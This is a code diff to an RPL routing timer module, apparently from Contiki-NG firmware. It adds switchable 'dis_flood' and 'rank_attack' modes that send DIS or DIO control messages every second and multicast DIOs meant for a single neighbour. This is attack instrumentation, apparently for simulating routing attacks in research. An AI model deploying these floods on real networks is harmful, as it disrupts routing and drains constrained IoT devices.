@@ -92,10 +92,16 @@ static struct ctimer periodic_timer; /* Not part of a DAG because used for gener
 void
 rpl_timers_schedule_periodic_dis(void)
 {
-  if(ctimer_expired(&dis_timer)) {
-    clock_time_t expiration_time = RPL_DIS_INTERVAL / 2 + (random_rand() % (RPL_DIS_INTERVAL));
-    ctimer_set(&dis_timer, expiration_time, handle_dis_timer, NULL);
-  }
+    if(ctimer_expired(&dis_timer)) {
+        clock_time_t expiration_time = RPL_DIS_INTERVAL / 2 + (random_rand() % (RPL_DIS_INTERVAL));
+
+        extern int dis_flood;
+        if (dis_flood) {
+            ctimer_set(&dis_timer, CLOCK_SECOND, handle_dis_timer, NULL);
+        } else {
+            ctimer_set(&dis_timer, expiration_time, handle_dis_timer, NULL);
+        }
+    }
 }
 /*---------------------------------------------------------------------------*/
 static void
@@ -137,6 +143,9 @@ new_dio_interval(void)
   curr_instance.dag.dio_send = 1;
   /* reset the redundancy counter */
   curr_instance.dag.dio_counter = 0;
+
+  extern int rank_attack;
+  if (rank_attack) ticks = CLOCK_SECOND;
 
   /* schedule the timer */
   ctimer_set(&curr_instance.dag.dio_timer, ticks, &handle_dio_timer, NULL);
@@ -219,7 +228,13 @@ handle_unicast_dio_timer(void *ptr)
 {
   uip_ipaddr_t *target_ipaddr = rpl_neighbor_get_ipaddr(curr_instance.dag.unicast_dio_target);
   if(target_ipaddr != NULL) {
-    rpl_icmp6_dio_output(target_ipaddr);
+    
+    extern int rank_attack;
+    if (rank_attack) {
+        rpl_icmp6_dio_output(NULL);
+    } else {
+        rpl_icmp6_dio_output(target_ipaddr);
+    }
   }
 }
 /*---------------------------------------------------------------------------*/
